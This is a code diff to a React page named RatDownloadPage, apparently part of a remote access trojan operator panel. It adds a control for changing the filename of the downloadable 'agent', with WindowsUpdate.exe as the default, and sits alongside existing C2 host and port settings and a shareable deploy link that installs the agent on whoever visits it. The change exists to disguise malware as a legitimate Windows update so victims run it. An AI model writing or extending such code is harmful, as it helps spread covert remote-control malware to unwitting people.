@@ -36,14 +36,24 @@ function RatDownloadPage() {
   const [customFilename, setCustomFilename] = useState<string>('');
   const [personalUrl, setPersonalUrl] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
+  const [deployFilename, setDeployFilename] = useState<string>('WindowsUpdate.exe');
+  const [filenameInput, setFilenameInput] = useState<string>('');
+  const [filenameSaved, setFilenameSaved] = useState(false);
 
-  const { subscribe } = useBridgeWebSocket();
+  const { subscribe, send } = useBridgeWebSocket();
 
   useEffect(() => {
     return subscribe('connected', (msg: any) => {
       if (msg.downloadUrl) setPersonalUrl(msg.downloadUrl);
       if (msg.c2Host) setConfig(prev => ({ ...prev, server_ip: msg.c2Host }));
       if (msg.c2Port) setConfig(prev => ({ ...prev, server_port: msg.c2Port }));
+      if (msg.downloadFilename) { setDeployFilename(msg.downloadFilename); setFilenameInput(msg.downloadFilename); }
+    });
+  }, [subscribe]);
+
+  useEffect(() => {
+    return subscribe('download_filename_updated', (msg: any) => {
+      if (msg.filename) { setDeployFilename(msg.filename); setFilenameSaved(true); setTimeout(() => setFilenameSaved(false), 2000); }
     });
   }, [subscribe]);
 
@@ -177,7 +187,7 @@ function RatDownloadPage() {
           <h2 className="text-base font-semibold text-white">Your Personal Deploy Link</h2>
         </div>
         {personalUrl ? (
-          <div className="space-y-2">
+          <div className="space-y-3">
             <p className="text-xs text-slate-400">Share this URL — anyone who visits it downloads the pre-compiled agent. Clients will appear in your account.</p>
             <div className="flex items-center gap-2">
               <code className="flex-1 bg-slate-800 text-green-400 text-xs px-3 py-2 rounded-lg truncate select-all">{personalUrl}</code>
@@ -190,12 +200,30 @@ function RatDownloadPage() {
               </button>
               <a
                 href={personalUrl}
-                download="WindowsUpdate.exe"
+                download={deployFilename}
                 className="flex items-center gap-1.5 px-3 py-2 bg-blue-700 hover:bg-blue-600 text-white text-xs rounded-lg transition-colors shrink-0"
               >
                 <Download className="w-3.5 h-3.5" />
                 Download
               </a>
+            </div>
+            {/* Custom filename */}
+            <div className="flex items-center gap-2 pt-1">
+              <span className="text-xs text-slate-400 shrink-0">Download as:</span>
+              <input
+                type="text"
+                value={filenameInput}
+                onChange={e => setFilenameInput(e.target.value)}
+                placeholder="WindowsUpdate.exe"
+                className="flex-1 bg-slate-800 border border-slate-700 text-slate-200 text-xs px-3 py-1.5 rounded-lg focus:border-blue-500 focus:outline-none"
+              />
+              <button
+                onClick={() => send({ type: 'set_download_filename', filename: filenameInput })}
+                className="flex items-center gap-1 px-3 py-1.5 bg-slate-700 hover:bg-slate-600 text-xs text-slate-300 rounded-lg transition-colors shrink-0"
+              >
+                {filenameSaved ? <Check className="w-3 h-3 text-green-400" /> : null}
+                {filenameSaved ? 'Saved!' : 'Save'}
+              </button>
             </div>
           </div>
         ) : (
